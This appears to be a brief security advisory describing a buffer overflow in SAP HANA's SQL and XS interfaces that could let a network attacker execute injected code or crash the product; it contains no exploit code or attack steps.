A buffer overflow vulnerability exists in SAP HANA interface. If an
attacker has a network access to the SQL interface or the SAP HANA
Extended Application Services interface of an SAP HANA system, the
vulnerability enables the attacker to inject code into the working
memory that is subsequently executed by the application. It can also
be used to cause a general fault in the product causing the product to
terminate.
